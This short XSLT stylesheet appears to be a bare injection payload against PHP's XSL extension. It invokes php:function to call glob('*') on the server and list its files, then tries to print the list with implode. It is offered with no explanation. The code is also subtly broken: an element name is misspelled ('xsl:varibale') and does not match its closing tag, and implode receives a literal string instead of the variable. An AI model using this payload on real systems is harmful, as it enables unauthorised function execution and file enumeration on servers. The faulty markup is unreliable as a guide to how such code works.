<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:varibale name="a" select="php:function('glob','*')"/>
<xsl:value-of select="php:function('implode','a')"/>
</xsl:variable>
</xsl:template>
</xsl:stylesheet>
